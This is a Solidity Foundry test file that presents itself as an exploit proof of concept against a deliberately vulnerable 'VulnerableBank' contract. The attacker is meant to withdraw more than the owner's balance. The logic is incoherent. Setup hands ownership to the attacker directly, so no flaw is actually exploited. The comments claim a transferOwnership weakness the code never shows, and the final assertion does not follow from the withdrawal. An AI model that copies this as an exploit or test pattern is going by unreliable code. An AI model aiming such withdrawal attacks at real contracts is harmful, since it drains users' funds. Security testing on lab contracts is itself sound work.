// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address owner;
    address attacker;

    function setUp() public override {
        super.setUp();
        target = new VulnerableBank();
        vm.label(address(target), "VulnerableBank");

        (owner,,,,,) = target.createOwnerAndBankDetails("Initial Owner", "initialOwner@bank.com");
        (attacker,,,,,) = target.createOwnerAndBankDetails("Attacker", "attacker@bank.com");

        // Transfer ownership to the attacker for easier exploitation
        vm.prank(owner);
        target.transferOwnership(attacker);
    }

    function testExploit() public {
        uint256 initialBalance = target.balances(owner);

        // Attack strategy: exploit transferOwnership by changing it to any address without proper validation
        // Exploitation happens here; ownership is already transferred

        vm.prank(attacker); // Switching context to the attacker for further operations
        target.withdraw(initialBalance + 1); // Attempt withdrawal more than allowed (exploit)

        assertEq(target.balances(attacker), initialBalance, "Attacker did not receive expected funds");
    }
}